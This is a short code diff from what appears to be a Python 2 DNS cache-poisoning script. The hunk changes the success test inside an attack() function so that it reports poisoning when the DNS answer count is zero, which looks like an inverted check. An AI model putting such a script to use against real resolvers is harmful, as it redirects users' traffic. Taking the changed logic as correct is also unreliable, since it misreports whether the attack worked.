@@ -94,7 +94,7 @@ def attack():
         response = sock.recv(4096)
         try:
             response = DNS(response[2:])
-            if response[DNS].na:
+            if not response[DNS].na:
                 print "Successfully poisonned our target with a dummy record !!"
                 exit(0)
             else:
